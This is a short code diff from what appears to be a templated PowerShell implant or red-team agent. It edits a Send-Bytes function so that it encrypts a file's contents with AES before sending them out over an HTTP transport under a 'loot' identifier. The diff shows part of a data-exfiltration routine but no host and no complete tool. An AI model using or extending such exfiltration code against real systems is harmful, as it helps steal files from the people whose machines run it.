@@ -485,7 +485,7 @@ function Send-Bytes {
     }
 
     {{'Write-Debug "Encrypting $Filename..."'|debug}}
-    $Body = (Decrypt-Code $Body $KEY)
+    $Body = (Encrypt-AES $Body $KEY)
 
     if ("{{transport}}" -match "^https?$") {
         Send-BytesViaHttp -LootId $LootId $Body $FileName
